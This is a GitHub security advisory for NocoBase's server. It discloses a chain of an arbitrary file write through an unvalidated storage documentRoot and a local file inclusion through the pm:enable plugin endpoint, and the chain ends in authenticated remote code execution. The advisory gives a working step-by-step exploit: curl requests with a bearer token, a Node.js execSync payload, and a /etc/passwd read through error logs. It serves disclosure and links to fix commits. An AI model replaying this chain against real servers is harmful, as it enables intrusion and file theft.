# [H] NocoBase: Arbitrary File Write chained with Local file Inclusion leads to Remote code execution

## Summary
Severity: High
Advisory: GHSA-ghvf-qf6h-g8x5
CWE: CWE-209, CWE-434, CWE-73, CWE-829
Ecosystem: npm
Published: 2026-08-20
Source: https://github.com/advisories/GHSA-ghvf-qf6h-g8x5
Type: github-advisory

## Affected
- npm: `@nocobase/server` — affected >=0 <2.1.5

## Details
## Executive Summary

Two vulnerabilities were identified and chained to achieve authenticated remote code execution

The first vulnerability allows any authenticated admin to redirect the file upload storage root to an arbitrary path on disk  including the application directory itself  by supplying an unsanitized `documentRoot` value to the `storages:update` API. The second vulnerability allows the same admin to trigger Node.js `require()` on any absolute filesystem path via the `pm:enable` plugin manager endpoint, which accepts user-supplied paths with no validation (Local File Inclusion).

Chained together, these two flaws allow an attacker with admin credentials to write a malicious file and have it trigger on the system achieving remote code execution.

A working proof-of-concept exploit chain was developed and verified, requiring only a valid admin session token.


## VULN 1: Arbitrary File Write via `storages:update` documentRoot Manipulation

### Summary

The file-manager plugin's storage update endpoint accepts an arbitrary `documentRoot` value without validation. An authenticated admin can overwrite a storage record's `documentRoot` to any absolute path on the filesystem, then upload files that land anywhere the Node.js process (root in default Docker deployments) can write  including the web root, the application source directory, or system paths.

### Vulnerable Components

`packages/plugins/@nocobase/plugin-file-manager/src/server/storages/local.ts` | `getDocumentRoot()` L24–27 |
`packages/plugins/@nocobase/plugin-file-manager/src/server/actions/attachments.ts` | `createMiddleware()` 
Server route: `POST /api/storages:update` 
Server route: `POST /api/attachments:upload` 

### Root Cause

`getDocumentRoot()` resolves the `documentRoot` field from the storage record:

```javascript
// packages/plugins/@nocobase/plugin-file-manager/src/server/storages/local.ts
const { documentRoot = process.env.LOCAL_STORAGE_DEST || path.join(process.cwd(), 'storage', 'uploads') } =
  this.storage.options || {};

return path.resolve(path.isAbsolute(documentRoot) ? documentRoot : path.join(process.cwd(), documentRoot));
```

`resolveSafePath()` is called during file upload to prevent filename traversal, but it uses the already-resolved (attacker-controlled) `documentRoot` as its safe root. There is **no validation on the `documentRoot` value itself** at creation or update time. An admin can set `documentRoot` to any path (`/`, `/etc`, `/var/www/html`, the app root) and the upload will write there.

The creation endpoint (`storages:create`) also accepts arbitrary `documentRoot`, but the **update endpoint is worse**: it silently replaces the root on an existing (potentially already-default) storage, bypassing any frontend guards.

### Steps to Reproduce

**Prerequisites:** Admin session token.


**Step 1  Get the local storage ID:**

```bash
curl -s "http://192.168.228.130:13000/api/storages" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInRlbXAiOnRydWUsImlhdCI6MTc3OTgzMTc1NCwic2lnbkluVGltZSI6MTc3OTgzMTc1NDE3MSwiZXhwIjoxNzc5OTE4MTU0LCJqdGkiOiJlZTJhMTU5Zi04MmE1LTQxZDctOTgyMC02ODlmOTM1Yjk2NWQifQ.Q_4m87ZDKI4bDW6QejoHYveGPNCaxzDJN-N_0B_pAfI"
```

Storage ID on this target: `366584416632832`


**Step 2  Create the RCE payload:**

```bash
cat > /tmp/rce_proof.js << 'EOF'
const { execSync } = require('child_process');
const fs = require('fs');
const out = execSync('id; whoami; hostname').toString();
fs.writeFileSync('/home/spooky/nocobase/storage/uploads/out.txt', out);
module.exports = {};
EOF

```
**Step 3  Redirect storage documentRoot to app CWD:**

```bash
curl -s -X POST "http://192.168.228.130:13000/api/storages:update?filterByTk=366584416632832" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInRlbXAiOnRydWUsImlhdCI6MTc3OTgzMTc1NCwic2lnbkluVGltZSI6MTc3OTgzMTc1NDE3MSwiZXhwIjoxNzc5OTE4MTU0LCJqdGkiOiJlZTJhMTU5Zi04MmE1LTQxZDctOTgyMC02ODlmOTM1Yjk2NWQifQ.Q_4m87ZDKI4bDW6QejoHYveGPNCaxzDJN-N_0B_pAfI" \
  -H "Content-Type: application/json" \
  -d '{"options":{"documentRoot":"."},"default":true}'
```
<img width="826" height="304" alt="image" src="https://github.com/user-attachments/assets/808bf5cf-f6cc-4df6-9d94-b84cff1dcd66" />

**Step 4  upload the RCE payload:**

The payload writes output to the NocoBase uploads directory, which is served statically on port 13000

```bash
curl -s -X POST "http://192.168.228.130:13000/api/attachments:upload" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInRlbXAiOnRydWUsImlhdCI6MTc3OTgzMTc1NCwic2lnbkluVGltZSI6MTc3OTgzMTc1NDE3MSwiZXhwIjoxNzc5OTE4MTU0LCJqdGkiOiJlZTJhMTU5Zi04MmE1LTQxZDctOTgyMC02ODlmOTM1Yjk2NWQifQ.Q_4m87ZDKI4bDW6QejoHYveGPNCaxzDJN-N_0B_pAfI" \
  -F "file=@/tmp/rce_proof.js;filename=rce_proof.js;type=application/javascript"
```

<img width="826" height="322" alt="image" src="https://github.com/user-attachments/assets/146492ff-7eeb-4742-a13d-6bb3f9e0cd72" />


**Now that the file is uploaded successfully we can trigger the RCE with the LFI shown below**

## VULN 2: Error-Based Local File Inclusion via `pm:enable` Unsanitized `requireModule()` Call

### Overview
`pm:enable` passes `filterByTk` directly to `require()` with no path validation. This is a standalone LFI primitive with two modes:

- **Non-JS files** (e.g. `/etc/passwd`): Node.js parses them as JavaScript, fails with a `SyntaxError` that embeds the file content in the error message. That error is written to `system_error_YYYY-MM-DD.log` and is downloadable via `logger:download` giving an attacker blind/error-based file read.
- **JS files** (e.g. an attacker-uploaded payload): the file executes as Node.js code in the server process  RCE. This is the second stage of the chain with VULN-01.

### Root Cause

The `enable` action takes `filterByTk` from query params and passes it directly to the CLI runner with zero validation:

```typescript
// packages/core/server/src/plugin-manager/options/resource.ts  L141-151
async enable(ctx, next) {
  const { filterByTk } = ctx.action.params;   // ← raw user input
  if (!filterByTk) {
    ctx.throw(400, 'plugin name invalid');
  }
  const keys = Array.isArray(filterByTk) ? filterByTk : [filterByTk];
  app.runAsCLI(['pm', 'enable', ...keys], { from: 'user' });  // ← no sanitization
  ctx.body = filterByTk;
  await next();
},
```

The CLI handler calls `requireModule(key)`:

```typescript
// packages/core/utils/src/requireModule.ts
export function requireModule(m: any) {
  if (typeof m === 'string') {
    m = require(m);   // ← arbitrary file executed as Node.js module
  }
  if (typeof m !== 'object') { return m; }
  return m.__esModule ? m.default : m;
}
```

`assertSafePluginPackageName()` exists in the codebase (validates against absolute paths and `..`) but is **never invoked** in the HTTP action path — only in storage directory helpers. The HTTP handler goes straight from user input → `require()`.

### Steps to Reproduce Error-Based File Read (Standalone)

**Step 1  Trigger require() on any file:**

```bash
curl -s "http://TARGET:13000/api/pm:enable?filterByTk=/etc/passwd" \
  -H "Authorization: Bearer TOKEN"
# Response: {"data":"/etc/passwd"} — 200 OK
```
Node.js attempts to parse `/etc/passwd` as a JavaScript module. It fails at the first `:` character with:

<img width="2064" height="530" alt="image" src="https://github.com/user-attachments/assets/6aca1e88-a1c6-466a-8061-a0f3f7fbd4f8" />

and we see the error message after sending the request:

<img width="1036" height="380" alt="image" src="https://github.com/user-attachments/assets/b8ddbf38-7de0-47ba-aa56-39ac4f2de400" />

**Step 2 navigate to the logger and download the system error log**

<img width="1142" height="720" alt="image" src="https://github.com/user-attachments/assets/84103a14-99a6-4db0-bf86-35d5d09f730d" />


now when we extract the .tar file we can see proof of local file inclusion (partial in this response):

<img width="1264" height="268" alt="image" src="https://github.com/user-attachments/assets/8f90ee8b-16d2-4bbf-8308-29ed80330ec8" />

## Remote code execution

With our node js payload sitting at the web root all we must do now is use the local file inclusion in pm:enable to trigger it 

```bash
curl -s "http://192.168.228.130:13000/api/pm:enable?filterByTk=/home/spooky/nocobase/rce_proof.js" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInRlbXAiOnRydWUsImlhdCI6MTc3OTgzMTc1NCwic2lnbkluVGltZSI6MTc3OTgzMTc1NDE3MSwiZXhwIjoxNzc5OTE4MTU0LCJqdGkiOiJlZTJhMTU5Zi04MmE1LTQxZDctOTgyMC02ODlmOTM1Yjk2NWQifQ.Q_4m87ZDKI4bDW6QejoHYveGPNCaxzDJN-N_0B_pAfI"
```

Retrieve output via NocoBase static file serving

<img width="832" height="214" alt="image" src="https://github.com/user-attachments/assets/1ed60982-fc93-48f0-8b34-4bae0412ced2" />

<img width="810" height="96" alt="image" src="https://github.com/user-attachments/assets/15241236-2701-4488-a9a9-a504c9505562" />

## References
- https://github.com/nocobase/nocobase/security/advisories/GHSA-ghvf-qf6h-g8x5
- https://github.com/nocobase/nocobase/pull/9628
- https://github.com/nocobase/nocobase/pull/9701
- https://github.com/nocobase/nocobase/commit/7c9ffe1427a529d62576b83c35222ba7ef9b8d11
- https://github.com/nocobase/nocobase/commit/a89e5a999b608bcb4ec67a845e924af0fb58a7c7
- https://github.com/nocobase/nocobase
